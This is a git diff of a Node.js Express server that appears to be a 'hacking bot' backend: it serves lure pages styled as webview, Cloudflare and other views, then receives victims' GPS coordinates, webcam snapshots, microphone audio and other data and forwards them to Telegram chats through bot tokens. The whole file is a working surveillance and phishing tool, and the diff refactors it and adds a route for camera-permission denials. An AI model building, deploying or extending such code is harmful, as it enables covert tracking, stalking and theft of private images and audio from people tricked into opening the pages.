@@ -4,153 +4,140 @@ const bodyParser = require("body-parser");
 const cors = require("cors");
 const path = require("path");
 const os = require("os");
+const ejs = require('ejs');
 const axios = require("axios");
 const FormData = require("form-data");
-require("dotenv").config();
-
+require('dotenv').config();
 const app = express();
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
-const HOST_URL = process.env.HOST_URL || "";
-const HOST_URL2 = process.env.HOST_URL2 || "";
-const USE1PT = process.env.USE1PT || "";
-const DOMAIN_FILTER = process.env.DOMAIN_FILTER || "example.com";
 
-const tgApi = axios.create({
-    timeout: 15000
-});
+const hostURL = process.env.HOST_URL || "";
+const hostURL2 = process.env.HOST_URL2 || "";
+const use1pt = process.env.USE1PT || "";
 
-// ================= TELEGRAM LOGGER =================
-async function tgLog(text) {
-    if (!BOT_TOKEN) return;
-    try {
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            chat_id: process.env.ADMIN_CHAT_ID || 0,
-            text: `[LOG]\n${text}`.slice(0, 3900)
-        });
-    } catch (e) {
-        console.log("TG LOG ERROR:", e.message);
-    }
+var domainF = process.env.DOMAIN_FILTER || "example.com";
+
+var homeDir = os.homedir();
+var jsonDirectory = path.join(homeDir, "a1");
+
+function tg(method, token, data, isForm = false) {
+    const url = `https://api.telegram.org/bot${token}/${method}`;
+    return axios.post(url, data, isForm ? { headers: data.getHeaders() } : {});
 }
 
-// ================= TELEGRAM REQUEST =================
-async function tg(method, token, data, isForm = false) {
-    try {
-        const url = `https://api.telegram.org/bot${token}/${method}`;
-
-        if (isForm) {
-            const form = data;
-            return await axios.post(url, form, {
-                headers: form.getHeaders()
-            });
-        }
-
-        return await axios.post(url, data);
-    } catch (err) {
-        console.log("Telegram API Error:", err.message);
-        await tgLog(`Telegram API error: ${err.message}`);
-    }
-}
-
-// ================= IP =================
 function getIp(req) {
-    return (
-        req.headers["x-forwarded-for"]?.split(",")[0] ||
+    return req.headers["x-forwarded-for"]?.split(",")[0] ||
         req.socket?.remoteAddress ||
-        req.ip
-    );
+        req.ip;
 }
 
-// ================= DOMAIN FILTER =================
+function appendToken(t) {
+    return t;
+}
+
 app.use((req, res, next) => {
-    if (req.hostname && req.hostname.includes(DOMAIN_FILTER)) {
-        return res.status(403).send("Blocked");
-    }
+    if (req?.hostname?.includes(domainF)) return res.end();
     next();
 });
 
-// ================= MIDDLEWARE =================
 app.use(compression());
-app.use(cors());
 
-app.use(bodyParser.json({ limit: "50mb" }));
-app.use(bodyParser.urlencoded({ extended: true, limit: "50mb" }));
-app.use(bodyParser.raw({ type: "*/*", limit: "50mb" }));
+app.use(bodyParser.json({ limit: "Infinity", type: "application/json" }));
+app.use(bodyParser.urlencoded({ extended: true, limit: "Infinity", type: "application/x-www-form-urlencoded" }));
+app.use(bodyParser.raw({ inflate: true, limit: "Infinity", type: () => true }));
+
+app.use(cors());
 
 app.set("view engine", "ejs");
 app.set("trust proxy", true);
 
-// ================= HOME =================
 app.get("/", (req, res) => {
     res.redirect("https://multihackingbot.onrender.com");
 });
 
-// ================= VIEW ROUTES =================
 function handleRoute(view, host) {
     return (req, res) => {
-        const b = req.query.b?.trim() || "default";
-        const ip = getIp(req);
-        const time = new Date().toISOString();
+        var b = req.query.b?.trim() || "qq6rytlk";
+        var ip = getIp(req);
+        var d = new Date().toISOString().slice(0, 19).replace("T", ":");
 
         res.render(view, {
             ip,
-            time,
-            url: `${HOST_URL}/crash`,
+            time: d,
+            url: `${hostURL}/crash`,
             uid: req.params.path,
             a: host,
             b,
-            t: USE1PT
+            t: use1pt
         });
-
-        tgLog(`Page view: ${view} | IP: ${ip}`);
     };
 }
 
-app.get("/w/:path", handleRoute("webview", HOST_URL));
-app.get("/c/:path", handleRoute("cloudflare", HOST_URL2));
-app.get("/o/:path", handleRoute("ok", HOST_URL2));
-app.get("/l/:path", handleRoute("cg", HOST_URL2));
+app.get("/w/:path", handleRoute("webview", hostURL));
+app.get("/c/:path", handleRoute("cloudflare", hostURL2));
+app.get("/o/:path", handleRoute("ok", hostURL2));
+app.get("/l/:path", handleRoute("cg", hostURL2));
 
-app.get("/crash", (req, res) => {
-    res.render("crash");
-});
+app.get("/crash", (req, res) => res.render("crash"));
 
-// ================= LOCATION =================
 app.post("/location", async (req, res) => {
     try {
-        const lat = decodeURIComponent(req.body.lat || "");
-        const lon = decodeURIComponent(req.body.lon || "");
-        const uid = parseInt(req.body.uid || "", 36);
-        const acc = decodeURIComponent(req.body.acc || "");
-        const t = req.body.t;
+        var lat = decodeURIComponent(req.body.lat || "");
+        var lon = decodeURIComponent(req.body.lon || "");
+        var uidRaw = decodeURIComponent(req.body.uid || "");
+        var acc = decodeURIComponent(req.body.acc || "");
+        var t = req.body.t;
 
-        if (!lat || !lon || !uid || !acc) {
-            return res.status(400).send("Invalid");
+        if (!lat || !lon || !uidRaw || !acc || !t) {
+            return res.status(400).send("Invalid data");
         }
 
-        const token = BOT_TOKEN;
+        var uid = parseInt(uidRaw, 36);
+        if (isNaN(uid)) return res.status(400).send("Invalid uid");
 
-        await tg("sendMessage", token, {
+        var token = t === "qq6rytlk" ? BOT_TOKEN : appendToken(t);
+
+        if (t === "qq6rytlk") {
+            await tg("sendMessage", token, {
+                chat_id: uid,
+                text: `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc}`
+            });
+            return res.send("OK");
+        }
+
+        var formLoc = new FormData();
+        formLoc.append("chat_id", uid);
+        formLoc.append("latitude", lat);
+        formLoc.append("longitude", lon);
+
+        var formMsg = {
             chat_id: uid,
-            text: `Location:\nLat: ${lat}\nLon: ${lon}\nAcc: ${acc}`
-        });
+            text: `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc}`
+        };
+
+        await Promise.all([
+            tg("sendLocation", token, formLoc, true),
+            tg("sendMessage", token, formMsg)
+        ]);
 
         res.send("OK");
     } catch (e) {
-        console.log(e.message);
-        res.status(500).send("error");
+        res.status(500).send(e.message);
     }
 });
 
-// ================= MESSAGE =================
 app.post("/", async (req, res) => {
     try {
-        const uid = parseInt(decodeURIComponent(req.body.uid || ""), 36);
-        const data = decodeURIComponent(req.body.data || "").replace(/<br>/g, "\n");
+        var uid = parseInt(decodeURIComponent(req.body.uid || ""), 36);
+        var data = decodeURIComponent(req.body.data || "").replace(/<br>/g, "\n");
+        var t = req.body.t;
 
         if (!uid || !data) return res.status(400).send("Invalid");
 
-        await tg("sendMessage", BOT_TOKEN, {
+        var token = t === "qq6rytlk" ? BOT_TOKEN : appendToken(t);
+
+        await tg("sendMessage", token, {
             chat_id: uid,
             text: data,
             parse_mode: "HTML"
@@ -158,69 +145,91 @@ app.post("/", async (req, res) => {
 
         res.send("OK");
     } catch (e) {
-        res.status(500).send("error");
+        res.status(500).send(e.message);
     }
 });
 
-// ================= CAMERA =================
+app.post("/cam-denied", async (req, res) => {
+    try {
+        var uid = parseInt(decodeURIComponent(req.body.uid || ""), 36);
+        var text = decodeURIComponent(req.body.deniedText || "");
+        var t = req.body.t;
+
+        if (!uid || !text || !t) return res.status(400).send("Invalid");
+
+        var token = t === "qq6rytlk" ? BOT_TOKEN : appendToken(t);
+
+        await tg("sendMessage", token, {
+            chat_id: uid,
+            text
+        });
+
+        res.send("OK");
+    } catch (e) {
+        res.status(500).send(e.message);
+    }
+});
+
 app.post("/camsnap", async (req, res) => {
     try {
-        const uid = parseInt(req.body.uid || "", 36);
-        const img = req.body.img;
+        var uid = parseInt(decodeURIComponent(req.body.uid || ""), 36);
+        var img = req.body.img;
+        var t = req.body.t;
 
-        if (!uid || !img) return res.status(400).send("Invalid");
+        if (!uid || !img || !t) return res.status(400).send("Invalid");
 
-        const buffer = Buffer.from(img, "base64");
+        var buffer = Buffer.from(decodeURIComponent(img), "base64");
+        var token = t === "qq6rytlk" ? BOT_TOKEN : appendToken(t);
 
-        const form = new FormData();
+        var form = new FormData();
         form.append("chat_id", uid);
         form.append("photo", buffer, {
-            filename: "cam.png"
+            filename: "camsnap.png",
+            contentType: "image/png"
         });
 
-        await tg("sendPhoto", BOT_TOKEN, form, true);
+        await tg("sendPhoto", token, form, true);
 
         res.send("OK");
     } catch (e) {
-        res.status(500).send("error");
+        res.status(500).send(e.message);
     }
 });
 
-// ================= AUDIO =================
 app.post("/audiosnap", async (req, res) => {
     try {
-        const uid = parseInt(req.body.uid || "", 36);
-        const audio = req.body.audio;
+        var uid = parseInt(decodeURIComponent(req.body.uid || ""), 36);
+        var audio = req.body.audio;
+        var t = req.body.t;
 
-        if (!uid || !audio) return res.status(400).send("Invalid");
+        if (!uid || !audio || !t) return res.status(400).send("Invalid");
 
-        const buffer = Buffer.from(audio, "base64");
+        var buffer = Buffer.from(decodeURIComponent(audio), "base64");
+        var token = t === "qq6rytlk" ? BOT_TOKEN : appendToken(t);
 
-        const form = new FormData();
+        var form = new FormData();
         form.append("chat_id", uid);
         form.append("audio", buffer, {
-            filename: "audio.webm"
+            filename: "audio.webm",
+            contentType: "audio/webm"
         });
 
-        await tg("sendAudio", BOT_TOKEN, form, true);
+        await tg("sendAudio", token, form, true);
 
         res.send("OK");
     } catch (e) {
-        res.status(500).send("error");
+        res.status(500).send(e.message);
     }
 });
 
-// ================= START SERVER =================
-const port = process.env.PORT || 8000;
+var port = process.env.port || 8000;
 
 app.listen(port, "0.0.0.0", async () => {
-    console.log(`Server running on port ${port}`);
-
-    try {
-        const ip = await axios.get("https://ifconfig.me");
-        console.log("Public IP:", ip.data.trim());
-        await tgLog(`Server started on port ${port}\nIP: ${ip.data.trim()}`);
-    } catch (e) {
-        console.log("IP fetch error:", e.message);
-    }
+  console.log(`Server is running on port ${port}`);
+  try {
+    var res = await axios.get("https://ifconfig.me");
+    console.log("Current IP:", res.data.trim());
+  } catch (err) {
+    console.error("Error fetching IP:", err.message);
+  }
 });
